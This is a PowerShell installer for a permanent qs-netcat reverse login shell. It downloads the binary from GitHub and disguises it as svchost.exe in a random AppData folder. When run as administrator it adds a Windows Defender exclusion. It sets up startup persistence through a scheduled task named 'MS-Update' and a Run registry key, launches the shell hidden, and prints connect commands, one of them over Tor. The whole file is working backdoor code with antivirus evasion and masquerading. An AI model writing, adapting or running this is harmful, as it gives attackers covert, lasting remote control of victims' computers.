# Install and start a permanent qs-netcat reverse login shell
#
# See https://qsocket.io/ for examples.
# 
# $env:DEBUG=1 # for verbose output.

$GITHUB_REPO="https://api.github.com/repos/qsocket"
$QS_UTIL="qs-netcat"
$QS_BIN_NAME="qs-netcat.exe"
$QS_BIN_HIDDEN_NAME="svchost.exe"
$QS_SCHEDULED_TASK_NAME="MS-Update"
$BANNER=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8gIElOID4gICAgICAgICAgICAgICAgICAgICAgICAgICItXyAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvICAgICAgLiAgfCAgLiAgICDjg73gvLzguojZhM2c4LqI4Ly9KSk+PS0gICAgICAgXCAgICAgICAgICAKICAg4Ly844Gk4LKg55uK4LKg4Ly944GkIOKUgD3iiaHOo08pKSAgIF8gICAgICAgIF8gICAgICAgLyAgICAgIDogXCB8IC8gOiAgICAgICAgICAgICAgICAgICAgICAgXCAgICAgICAgIAogICBfXyBfIF9fXyAgX19fICAgX19ffCB8IF9fX19ffCB8XyAgICAvICAgICAgICAnLV9fXy0nICAgICAgICAgIOKYnCjinY3htKXinY3KiykpPi0gICAgXCAgICAgIAogIC8gX2AgLyBfX3wvIF8gXCAvIF9ffCB8LyAvIF8gXCBfX3wgIC9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXyBcICAgICAgCiB8IChffCBcX18gXCAoXykgfCAoX198ICAgPCAgX18vIHxfICAgICAgICBfX19fX19ffCB8X19fX19fX19fX19fX19fX19fX19fX19fLS0iIi1MIAogIFxfXywgfF9fXy9cX19fLyBcX19ffF98XF9cX19ffFxfX3wgICAgICAvICAgICAgIEYgSiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwgCiAgICAgfF98ICAgQ29weXJpZ2h0IChjKSAyMDIzIFFzb2NrZXQgICAgLyAgICAgICBGICAgSiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTAogIGh0dHBzOi8vZ2l0aHViLmNvbS9xc29ja2V0LyAgICAgICAgICAgLyAgICAgIDonICAgICAnOiAgIOKUgD3iiaHOoygoKCDjgaTil5XZhM2c4peVKeOBpCAgICAgICAgIEYKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLyAgT1VUIDwgJy1fX18tJyAgICAgICAgICAgICAgICAgICAgICAgICAgICAvIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXy0tIgoK")) | Out-String

function Print-Warning($str)
{
    Write-Host "[!] " -ForegroundColor Yellow -NoNewline; 
    Write-Host "$str" 
}

function Print-Status($str)
{
    Write-Host "[*] " -ForegroundColor Yellow -NoNewline; 
    Write-Host "$str" 
}

function Print-Success($str)
{
    Write-Host "[+] " -ForegroundColor Green -NoNewline; 
    Write-Host "$str" 
}

function Print-Error($str)
{
    Write-Host "[-] " -ForegroundColor Red -NoNewline; 
    Write-Host "$str" 
}

function Print-Fatal($str)
{
    Write-Host "[!] " -ForegroundColor Red -NoNewline; 
    Write-Host "$str" 
    exit 1
}

function Print-Progress($str)
{
    if (-Not (Test-Path 'env:DEBUG')) { 
        Write-Host "[*] " -ForegroundColor Yellow -NoNewline;
        Write-Host "$str" -NoNewline;
        Write-Host ("."*(60-$str.Length)) -NoNewline;
    }  
}

function Print-Ok()
{
    if (-Not (Test-Path 'env:DEBUG')) { 
        Write-Host "[" -NoNewline;
        Write-Host "OK" -ForegroundColor Green -NoNewline;
        Write-Host "]";
    }  
}

function Print-Fail()
{
    if (-Not (Test-Path 'env:DEBUG')) { 
        Write-Host "[" -NoNewline;
        Write-Host "FAIL" -ForegroundColor Red -NoNewline;
        Write-Host "]";
    }  
}

function Print-Debug($str)
{
    if (Test-Path 'env:DEBUG') { 
        Write-Host "[*] " -ForegroundColor Yellow -NoNewline; 
        Write-Host "$str" 
    }  
}

function Is-Administrator  
{  
    return [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
}

function Get-Latest-Release  
{

    $QS_PACKAGE="windows_386.tar.gz"
    Switch ($Env:PROCESSOR_ARCHITECTURE)
    {
        "x86" {$QS_PACKAGE="windows_386.tar.gz"}
        "AMD64" {$QS_PACKAGE="windows_amd64.tar.gz"}
        "ARM64" {$QS_PACKAGE="windows_arm64.tar.gz"}
        "ARM" {$QS_PACKAGE="windows_arm.tar.gz"}
        default {Print-Fatal "Unsupported Windows architecture!"}
    }
    Print-Debug "Package: $QS_PACKAGE"

    try {
        $r = Invoke-WebRequest "$GITHUB_REPO/$QS_UTIL/releases/latest" -UseBasicParsing
        $lines = $r.Content.Split('"')
        $uri=(echo $lines | Select-String '/releases/download/' | Select-String "$QS_PACKAGE")
    }catch {
        Print-Debug $_.Exception
        throw $_.Exception
    }
    return $uri.Line.split()
}

function Download-Qsocket-Util($path)
{
    try {
        $downloadUrl = Get-Latest-Release
        Print-Debug "Latest Release: $downloadUrl"
        $WebClient = New-Object System.Net.WebClient
        $WebClient.Headers.Add("Accept","application/octet-stream")
        $WebClient.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
        $WebClient.DownloadFile($downloadUrl, $path)
        if(Test-Path -Path "$path" -PathType Leaf){
            Print-Debug "Qsocket binary downloaded under: $path"
        }
    }catch{
        Print-Debug $_.Exception
        throw $_.Exception
    }
}

function Create-Sceduled-Task($path, $secret)
{
    Print-Debug "Creating scheduled task..."
    Print-Debug "Task command: powershell.exe -WindowStyle Hidden -Command $path -liqs $secret"
    try {
        $A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$path -liqs $secret`""
        $T = New-ScheduledTaskTrigger -AtStartup
        if(Is-Administrator){
            $P = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
        }else{
            $P = New-ScheduledTaskPrincipal "$env:USERNAME"
        }
        $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P
        $S = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
        Register-ScheduledTask "${QS_SCHEDULED_TASK_NAME}_${RAND_NAME}" -InputObject $D | out-null
    }catch {
        Print-Debug $_.Exception
        throw $_.Exception
    }
}

function Create-Run-Key($path, $secret)
{
    Print-Debug "Adding CurrentVersion\Run registery..."
    try {
        if(Is-Administrator){
            Print-Debug "Running as administrator"
            reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command \`"$path -liqs $secret\`"" >$null
        }else{
            Print-Debug "Running as $env:UserName"
            Print-Debug "powershell.exe -WindowStyle Hidden -Command \`"$path -liqs $secret\`""
            reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command \`"$path -liqs $secret\`"" >$null
        }
    }catch {
        Print-Debug $_.Exception
        throw $_.Exception
    }
    Print-Debug "Auto-run key added successfully"  
}

function Print-Usage($secret_file)
{
    Write-Host " `n"
    Get-Content $secret_file | & $QS_PATH "--qr"
    Write-Host " `n"
    Write-Host "# >>> Connect ============> qs-netcat -i -s $SECRET" -ForegroundColor Green
    Write-Host "# >>> Connect With TOR ===> qs-netcat -T -i -s $SECRET" -ForegroundColor Green
    Write-Host " `n"
}


Write-Host "$BANNER"
$SECRET=""
$RAND_NAME= -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
$SECRET_FILE= Join-Path -Path "$env:TMP" -ChildPath "$RAND_NAME.txt"
$QS_DIR= Join-Path -Path "$env:APPDATA" -ChildPath "$RAND_NAME" 
$QS_PATH= Join-Path -Path $QS_DIR -ChildPath "$QS_BIN_HIDDEN_NAME"
$PERSISTENCE=$false
Print-Status "QSocket Dir: $QS_PATH"
mkdir $QS_DIR >$null

if (Is-Administrator) {
    Print-Progress "Adding defender exclusion path"
    try {
        Add-MpPreference -ExclusionPath "$QS_DIR" 2>$null
        Print-Ok
    }catch {
        Print-Fail
    }
}

# Download the latest qsocket utility
try {
    Print-Progress "Downloading binaries"
    Download-Qsocket-Util(Join-Path -Path $QS_DIR -ChildPath "$RAND_NAME.tar.gz")
    Print-Ok  
}catch {
    Print-Fail
    Print-Fatal "Failed downloading QSocket util."
}

# Extract TAR.GZ to QS_PATH
try {
    Print-Progress "Unpacking binaries"
    tar zx -C "$QS_DIR" -f (Join-Path -Path $QS_DIR -ChildPath "$RAND_NAME.tar.gz") 2>$null
    Print-Ok
}catch{
    Print-Fail
    Print-Fatal "Failed extracting Qsocket util."
}

try {
    Print-Progress "Copying binaries"
    Remove-Item -Path (Join-Path -Path $QS_DIR -ChildPath "$RAND_NAME.tar.gz")
    Rename-Item -Path (Join-Path -Path $QS_DIR -ChildPath "$QS_BIN_NAME") -NewName "$QS_BIN_HIDDEN_NAME"
    if(! (Test-Path -Path $QS_PATH -PathType Leaf)){
        Print-Fail
        Print-Fatal "Move failed. ->  $QS_PATH"
    }
    Print-Ok
}catch {
    Print-Fail
    Print-Fatal "Unable to copy qsocket binaries."
}

try {
    Print-Progress "Testing qsocket binaries"
    $pinfo = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName = $QS_PATH
    $pinfo.RedirectStandardError = $true
    $pinfo.UseShellExecute = $false
    $pinfo.Arguments = "-g"
    $proc = New-Object System.Diagnostics.Process
    $proc.StartInfo = $pinfo
    $proc.Start() | Out-Null
    $proc.WaitForExit()
    $SECRET = $proc.StandardError.ReadToEnd()
    $SECRET | Out-File -FilePath "$SECRET_FILE"
    Print-Ok
}catch{
    Print-Fail
    Print-Fatal "Binary test failed! Exiting..."
}

if ($SECRET.Length -eq 0) {
    Print-Fatal "QSocket binary not working properly! Exiting..."
}

if (Is-Administrator) {
  try {
    Print-Progress "Installing system wide permanent access via schtask"
    Create-Sceduled-Task $QS_PATH $SECRET
    Print-Ok
    $PERSISTENCE=$true
  }catch{
    Print-Fail
  }
}

try {
    Print-Progress "Installing system wide permanent access via registery"
    Create-Run-Key $QS_PATH $SECRET
    Print-Ok
    $PERSISTENCE=$true
}catch{
    Print-Fail
}

if ($PERSISTENCE -eq $false) {
  Print-Warning "Permanent install methods failed! Access will be lost after reboot."
}

try {
    Print-Progress "Starting qsocket utility"
    Print-Debug ("Path: "+(Join-Path -Path $QS_PATH -ChildPath "$QS_BIN_HIDDEN_NAME"))
    Start-Process $QS_PATH "-liqs $SECRET" -WindowStyle Hidden
    Print-Ok
}catch{
    Print-Fail
}
Print-Usage($SECRET_FILE)
